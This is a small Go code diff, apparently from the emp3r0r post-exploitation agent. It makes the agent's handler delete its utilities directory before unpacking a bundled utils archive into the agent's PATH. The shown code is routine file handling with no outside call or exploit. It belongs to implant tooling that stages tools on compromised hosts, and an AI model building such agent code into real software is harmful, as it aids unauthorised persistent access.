@@ -27,12 +27,14 @@ func VaccineHandler() (out string) {
 	}
 
 	// unpack utils.tar.bz2 to our PATH
+	os.RemoveAll(emp3r0r_data.UtilsPath) // archiver fucking aborts when files already exist
 	if !util.IsFileExist(emp3r0r_data.UtilsPath) {
 		if err = os.MkdirAll(emp3r0r_data.UtilsPath, 0700); err != nil {
 			log.Print(err)
 			return fmt.Sprintf("mkdir: %v", err)
 		}
 	}
+
 	if err = archiver.Unarchive(emp3r0r_data.AgentRoot+"/utils.tar.bz2", emp3r0r_data.UtilsPath); err != nil {
 		log.Printf("Unarchive: %v", err)
 		return fmt.Sprintf("Unarchive: %v", err)
